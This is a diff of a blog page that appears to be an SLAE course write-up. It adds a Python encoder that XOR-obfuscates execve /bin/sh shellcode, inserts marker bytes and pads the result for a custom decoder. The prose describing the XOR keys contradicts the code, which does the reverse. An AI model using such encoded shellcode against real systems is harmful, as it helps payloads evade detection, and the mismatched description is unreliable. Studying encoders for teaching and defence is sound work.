@@ -89,32 +89,73 @@
 			<br><section id="Encoding"><h2>Encoding the Payload</h2></section>
 
 											<p>
-												Starting at the beginning of the Proof of Concept (PoC), the <i>execve-stack</i> payload needs to be encoded. &nbsp;This can be done using high-level languages like C or Python.
-												to perform whatever operation is necessary on the bytes. &nbsp;Python will be used in this case.
+												&emsp; &emsp;Starting at the beginning of the Proof of Concept (PoC), the <i>execve-stack</i> payload needs to be encoded. &nbsp;This can be done using high-level languages like C or Python.
+												to perform whatever operation is necessary on the bytes. &nbsp;Python will be used in this case. &nbsp;Using the insertion encoder as a template, the below Python
+												program was drafted.
 											</p>
 
 											<pre>
 												<code class="language-python" style=display:block;white-space:pre-wrap>
-#!/usr/bin/python3
+#!/usr/bin/python
 
-# Placeholder shellcode (reverse shell).  Needs to have execve-stack shellcode
-shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+# Placeholder shellcode (reverse shell).  Needs to have execve-stack shellcode. FYI: 25 bytes long
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
-# Need to decide on an encoding method. Insertion is off limits as it was done in SLAE lecture
+encoded = ""
+encoded2 = ""
+
+index = 1
+# Need to decide on an encoding method. Insertion can be done as an intermediate step.
 # split shellcode into byte array
-# for byte in shellcode byte array:
-#    run an operation on byte (i.e. multiply by \x69)
+for byte in bytearray(shellcode):
+	#print index(byte)
+	if index % 5 == 0:
+		y = byte^0x24
+		encoded += '\\x'
+		encoded += '%02x' % y  # see pyformat.info on use of % in formatting
+		encoded += '\\x%02x' % 0x69	# insert 0x69 after every 5th byte
 
+		encoded2 += '0x'
+		encoded2 += '%02x,' % y
+		encoded2 += '0x%02x,' % 0x69
 
-# put byte array back together into string
-# print encoded shellcode string
+	else:
+		z = byte^0x25
+		encoded += '\\x'
+		encoded += '%02x' % z	# else XOR with 0x25
 
+		encoded2 += '0x'
+		encoded2 += '%02x,' % z
+
+	index += 1
+
+# Pad shellcode to reach a length divisible by 6
+## each byte is technically 4 characters so divide len by 4 to get byte length
+shellcode_length = len(encoded)/4
+extra_instructions = shellcode_length % 6
+if extra_instructions > 0:
+	encoded += ('\\x%02x' % 0x90) * (6 - extra_instructions)
+	encoded2 += ('0x%02x,' % 0x90) * (6 - extra_instructions)
+
+print encoded
+print " "
+print encoded2
 												</code>
 											</pre>
 
+											<p>
+												The custom encoding scheme attempted to XOR all bytes with 0x24 except those at multiples of 5: fifth byte, fifth byte, and so on. &nbsp;Those bytes will instead be XOR'ed with 0x25.
+												 &nbsp;Additionally at the fifth bytes, 0x69	is inserted after XORing with 0x25. &nbsp;All of this is done in two formats: <i>\x</i> format and <i>0x</i> format.
+											</p>
+											<center><div class="tenor-gif-embed" data-postid="9094365" data-share-method="host" data-width="60%" data-aspect-ratio="1.4228571428571428"><a href="https://tenor.com/view/spongebob-25-patrick-star-24-gif-9094365">Spongebob 25 GIF</a> from <a href="https://tenor.com/search/spongebob-gifs">Spongebob GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script></center><br>
 
-
-
+											<p>
+												An important formatting concept in Python involves the '%' symbol. &nbsp;Instead of the modulo operator, '%' is used with a string argument to convey byte formatting. &nbsp;This
+												concept was introduced in Python Enhancement Proposal (PEP) <a href="https://www.python.org/dev/peps/pep-0461/" target="_blank" style="color:blue;">461</a>.<br>
+												&emsp; &emsp;Although not applicable to <i>execve-stack</i> shellcode, a padding routine is added after the encoding loop to ensure the final shellcode is cleanly divisible by six. &nbsp;This
+												 property is important during the decoding phase. &nbsp;Run the encoder and copy/paste the second encoded output into <i>decoder.nasm</i>, which is in the next section.
+											</p>
+											<center><div class="image post"><img src="../images/slae/assignment4/2-encoded-shellcode.png" alt="" /></div></center><br>
 
 
 
